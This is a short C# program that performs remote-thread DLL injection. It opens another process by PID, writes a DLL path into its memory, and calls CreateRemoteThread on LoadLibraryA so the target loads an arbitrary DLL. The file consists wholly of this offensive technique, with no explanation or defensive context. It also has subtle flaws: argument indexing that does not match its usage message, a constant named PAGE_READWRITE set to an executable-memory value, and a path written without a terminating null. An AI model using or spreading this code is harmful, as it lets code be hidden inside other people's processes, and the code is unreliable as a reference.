using System;
using System.Runtime.InteropServices;

namespace RemoteThreadProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocatioinType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        //public delegate uint LPTHREAD_START_ROUTINE(uint lpParam);

        public const int
        PAGE_READWRITE = 0x40,
        PROCESS_VM_OPERATION = 0x0008,
        PROCESS_VM_READ = 0x0010,
        PROCESS_VM_WRITE = 0x0020,
        PROCESS_CREATE_THREAD = 0x0002,
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000;

        static void Main(string[] args)
        {

            if (args.Length < 3)
            {
                Console.Write("Usage: remotethread <pid> <dllpath>\n");
            }

            uint pid = UInt32.Parse(args[1]);
            IntPtr hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD, false, pid);

            IntPtr memLoc = (IntPtr) null;
            IntPtr buffer = VirtualAllocEx(hProcess, memLoc, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            int output;
            WriteProcessMemory(hProcess, buffer, System.Text.Encoding.UTF8.GetBytes(args[2]), (UInt32)args[2].Length, out output);

            IntPtr lpThreadId = (IntPtr) null;
            IntPtr hThread = CreateRemoteThread(hProcess, (IntPtr)null, 0, GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"), buffer, 0, lpThreadId);

            return;
        }
    }
}
